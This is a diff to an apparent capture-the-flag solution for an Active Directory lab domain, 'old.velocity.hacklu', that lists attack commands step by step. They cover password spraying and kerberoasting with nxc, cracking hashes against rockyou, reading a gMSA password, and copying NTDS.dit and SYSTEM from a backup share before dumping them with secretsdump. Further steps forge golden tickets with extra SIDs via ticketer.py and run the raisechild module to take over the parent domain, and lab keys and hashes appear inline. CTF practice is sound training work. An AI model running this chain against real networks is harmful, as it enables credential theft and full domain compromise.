@@ -17,23 +17,26 @@
 3. `nxc smb DC-OLD -u users.txt -p users.txt --no-bruteforce --continue-on-success`
 4. `nxc ldap DC-OLD -u svc_test -p svc_test --kerberoast kerb.hashes`
 5. `john kerb.hashes --wordlist=/usr/share/wordlists/rockyou.txt `
-6. `nxc ldap DC-NEW -u svc_granite_sync -p granitecowboy9 -d old.velocity.hacklu --gmsa`
-7. `nxc smb DC-NEW -u svc_backup_gmsa$ --aesKey aa1af8ec9dc16864044bff3a34daec3fdf347e4a90becb2a75eb3310ee4fd862 --share Backup$ --get-file EXPORT/SYSTEM SYSTEM`
-8. `nxc smb DC-NEW -u svc_backup_gmsa$ --aesKey aa1af8ec9dc16864044bff3a34daec3fdf347e4a90becb2a75eb3310ee4fd862 --share Backup$ --get-file EXPORT/NTDS.dit NTDS.dit`
+6. `nxc ldap DC-NEW -u svc_granite_sync -p Granite00 -d old.velocity.hacklu --gmsa -k`
+7. `nxc smb DC-NEW -u svc_backup_gmsa$ --aesKey 27aea95f3198459b86f616481b37d145 --share Backup$ --get-file EXPORT/SYSTEM SYSTEM`
+8. `nxc smb DC-NEW -u svc_backup_gmsa$ --aesKey 27aea95f3198459b86f616481b37d145 --share Backup$ --get-file EXPORT/NTDS.dit NTDS.dit`
 9. `secretsdump.py LOCAL -system SYSTEM -ntds NTDS.dit`
-10. Domain escalation:
+10. Get domain SIDs
+    1. `nxc ldap 192.168.109.10 -u svc_granite_sync -p Granite00 -d old.velocity.hacklu --get-sid -k`
+    2. `nxc ldap 192.168.109.20 -u svc_granite_sync -p Granite00 --get-sid -k`
+11. Domain escalation:
     1. Ticketer:
-        1. `ticketer.py Administrator -aesKey b64df33cec7c1da8de222c9c895fef9b765220eaebfa49c0686dd69c3630ef87 -domain old.velocity.hacklu -domain-sid S-1-5-21-91039893-2106716671-4032146289 -extra-sid S-1-5-21-3548048988-352057793-1984169777-500`
+        1. `ticketer.py Administrator -aesKey 6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89 -domain old.velocity.hacklu -domain-sid S-1-5-21-976573591-227444304-1123500008 -extra-sid S-1-5-21-274105150-4017454061-1646591600-500`
         2. `export KRB5CCNAME=Administrator.ccache`
         3. `nxc smb DC-NEW --use-kcache --ntds`
     2. NXC raisechild:
-        1. `ticketer.py Administrator -aesKey b64df33cec7c1da8de222c9c895fef9b765220eaebfa49c0686dd69c3630ef87 -domain old.velocity.hacklu -domain-sid S-1-5-21-91039893-2106716671-4032146289`
+        1. `ticketer.py Administrator -aesKey 6b6183c68615ac05267d2d425c32bd63d2a21e9d0c8baa6498336bed0d3deb89 -domain old.velocity.hacklu -domain-sid S-1-5-21-976573591-227444304-1123500008`
         2. `export KRB5CCNAME=Administrator.ccache`
         3. `nxc smb DC-OLD --use-kcache --ntds`
         4. `nxc ldap DC-OLD -u Administrator -H d6fec3954c99c7c2250c16d81feaa9e9 -M raisechild`
         5. `rm Administrator.ccache`
         6. `nxc smb DC-NEW --use-kcache --ntds`
-        7. `nxc smb DC-NEW --use-kcache --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
+12. `nxc smb DC-NEW --use-kcache --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
 
 
 
